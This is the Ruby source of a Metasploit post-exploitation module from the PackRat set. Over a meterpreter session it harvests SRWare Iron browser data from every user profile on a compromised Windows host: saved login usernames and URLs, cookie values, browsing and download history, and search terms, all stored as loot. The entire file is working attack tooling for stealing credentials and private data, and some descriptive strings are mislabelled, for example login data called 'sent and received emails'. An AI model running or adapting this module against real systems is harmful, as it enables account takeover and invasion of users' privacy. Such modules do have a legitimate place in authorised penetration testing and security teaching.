##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Srware credential gatherer',
                      'Description' => %q{
                      PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
      PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
      Further details can be found in the module documentation.
      This is a module that searches for Srware credentials on a windows remote host. SRWare Iron is a Chromium-based web browser developed by the German company SRWare.
      },
                      'License' => MSF_LICENSE,
                      'Author' =>
                        [
                          'Kazuyoshi Maruta',
                          'Daniel Hallsworth',
                          'Barwar Salim M',
                          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
                        ],
                      'Platform' => ['win'],
                      'SessionTypes' => ['meterpreter'],
                      'artifacts' =>
                        {
                          "application": "srware",
                          "app_category": "browsers",
                          "gatherable_artifacts": [
                            {
                              "filetypes": "logins",
                              "path": "LocalAppData",
                              "dir": "Chromium",
                              "artifact_file_name": "Login Data",
                              "description": "SRware's sent and received emails",
                              "credential_type": "sqlite",
                              "sql_search": [
                                {
                                  "sql_description": "Database Commands which exports SRware's Login data",
                                  "sql_table": "logins",
                                  "sql_column": "action_url, username_value"
                                }
                              ]
                            },
                            {
                              "filetypes": "cookies",
                              "path": "LocalAppData",
                              "dir": "Chromium",
                              "artifact_file_name": "Cookies",
                              "description": "SRware's cookies",
                              "credential_type": "sqlite",
                              "sql_search": [
                                {
                                  "sql_description": "Database Commands which exports SRware's Login data",
                                  "sql_table": "cookies",
                                  "sql_column": "host_key, name, path, value"
                                }
                              ]
                            },
                            {
                              "filetypes": "web_history",
                              "path": "LocalAppData",
                              "dir": "Chromium",
                              "artifact_file_name": "History",
                              "description": "SRware's visited websites history",
                              "credential_type": "sqlite",
                              "sql_search": [
                                {
                                  "sql_description": "Database Commands which exports SRware's Login data",
                                  "sql_table": "urls",
                                  "sql_column": "url, title"
                                },
                                {
                                  "sql_description": "Database Commands which exports SRware's Login data",
                                  "sql_table": "downloads",
                                  "sql_column": "current_path, site_url"
                                },
                                {
                                  "sql_description": "Database Commands which exports SRware's Login data",
                                  "sql_table": "segments",
                                  "sql_column": "name"
                                },
                                {
                                  "sql_description": "keyword search terms",
                                  "sql_table": "keyword_search_terms",
                                  "sql_column": "term"
                                }
                              ]
                            }
                          ]
                        }
          ))

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', module_info['artifacts'][:'gatherable_artifacts'].map { |k| k[:'filetypes'] }.uniq.unshift('All')])
      ])
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA_FROM_FILE: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, module_info['artifacts'])

    end

    print_status 'PackRat credential sweep Completed'
  end
end

